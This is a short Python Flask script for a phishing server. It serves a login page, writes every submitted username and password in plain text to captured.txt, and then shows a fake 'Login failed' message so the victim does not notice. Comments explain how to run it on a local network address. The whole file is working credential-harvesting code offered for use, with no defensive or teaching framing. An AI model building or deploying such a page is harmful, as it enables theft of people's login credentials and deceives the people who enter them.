from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture_login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open("captured.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")

    return "<h3>Login failed: Invalid username or password</h3>"

if __name__ == '__main__':
    app.run(host='192.168.1.6', port=5000, debug=True) # When you are testing, change the host to your local IP address
# To run the server, use the command: python server.py
